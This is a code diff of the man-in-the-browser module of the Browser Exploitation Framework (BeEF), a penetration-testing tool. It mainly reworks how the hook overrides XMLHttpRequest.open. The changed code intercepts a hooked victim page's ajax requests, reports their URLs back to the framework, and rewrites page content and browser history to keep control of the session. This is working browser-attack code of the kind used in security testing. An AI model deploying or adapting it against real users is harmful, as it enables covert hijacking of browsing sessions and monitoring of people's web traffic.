@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 
 beef.mitb = {
 
@@ -23,47 +14,30 @@ beef.mitb = {
         beef.mitb.cid = cid;
         beef.mitb.curl = curl;
         /*Override open method to intercept ajax request*/
-        var xml_type;
+        var hook_file = "<%= @hook_file %>";
 
         if (window.XMLHttpRequest && !(window.ActiveXObject)) {
 
-            xml_type = 'XMLHttpRequest';
-        }
-
-        if (xml_type == "XMLHttpRequest") {
             beef.mitb.sniff("Method XMLHttpRequest.open override");
             (function (open) {
-                XMLHttpRequest.prototype.open = function (method, url, async, user, pass) {
+                XMLHttpRequest.prototype.open = function (method, url, async, mitb_call) {
+                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
+                    // or a request initiated by the MiTB itself.
+                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
+                        open.call(this, method, url, async, true);
+                    }else {
+                        var portRegex = new RegExp(":[0-9]+");
+                        var portR = portRegex.exec(url);
+                        var requestPort;
+                        if (portR != null) { requestPort = portR[0].split(":")[1]; }
 
-                    var portRegex = new RegExp(":[0-9]+");
-                    var portR = portRegex.exec(url);
-                    /*return :port*/
-                    var requestPort;
-
-                    if (portR != null) {
-                        requestPort = portR[0].split(":");
-                    }
-
-                    if ((user == "beef") && (pass == "beef")) {
-                        /*a poisoned something*/
-                        open.call(this, method, url, async, null, null);
-                    }
-
-
-                    else if (url.indexOf("hook.js") != -1 || url.indexOf("/dh?") != -1) {
-                        /*a beef hook.js polling or dh */
-                        open.call(this, method, url, async, null, null);
-                    }
-
-                    else {
-
+                        //GET request
                         if (method == "GET") {
+                            //GET request -> cross-domain
                             if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port )) {
                                 beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
                                 window.open(url);
-
-                            }
-                            else {
+                            }else { //GET request -> same-domain
                                 beef.mitb.sniff("GET [Ajax Request]: " + url);
                                 if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
                                     var title = "";
@@ -72,26 +46,19 @@ beef.mitb = {
                                     } else {
                                         title = document.getElementsByTagName("title")[0].innerHTML;
                                     }
-                                    /*write the url of the page*/
+                                    // write the url of the page
                                     history.pushState({ Be:"EF" }, title, url);
-
                                 }
-
                             }
-
-                        }
-                        else {
-                            /*if we are here we have an ajax post req*/
-                            beef.mitb.sniff("Post ajax request to: " + url);
-                            open.call(this, method, url, async, user, pass);
-
+                        }else{
+                            //POST request
+                            beef.mitb.sniff("POST ajax request to: " + url);
+                            open.call(this, method, url, async, true);
                         }
                     }
                 };
             })(XMLHttpRequest.prototype.open);
-
         }
-
     },
 
     // Initializes the hook on anchors and forms.
@@ -170,7 +137,7 @@ beef.mitb = {
     fetchForm:function (url, query, target) {
         try {
             var y = new XMLHttpRequest();
-            y.open('POST', url, false, "beef", "beef");
+            y.open('POST', url, false, true);
             y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             y.onreadystatechange = function () {
                 if (y.readyState == 4 && y.responseText != "") {
@@ -190,14 +157,13 @@ beef.mitb = {
     fetch:function (url, target) {
         try {
             var y = new XMLHttpRequest();
-            y.open('GET', url, false, "beef", "beef");
+            y.open('GET', url, false, true);
             y.onreadystatechange = function () {
                 if (y.readyState == 4 && y.responseText != "") {
-
                     target.innerHTML = y.responseText;
                     setTimeout(beef.mitb.hook, 10);
                 }
-            }
+            };
             y.send(null);
             beef.mitb.sniff("GET: " + url);
             return true;
@@ -213,7 +179,7 @@ beef.mitb = {
         try {
             var target = document.getElementsByTagName("html")[0];
             var y = new XMLHttpRequest();
-            y.open('GET', url, false, "beef", "beef");
+            y.open('GET', url, false, true);
             y.onreadystatechange = function () {
                 if (y.readyState == 4 && y.responseText != "") {
                     var title = "";
@@ -232,11 +198,9 @@ beef.mitb = {
             beef.mitb.sniff("GET: " + url);
 
         } catch (x) {
-
-
+            // the link is cross-domain, so load the resource in a different tab
             window.open(url);
             beef.mitb.sniff("GET [New Window]: " + url);
-
         }
     },
 
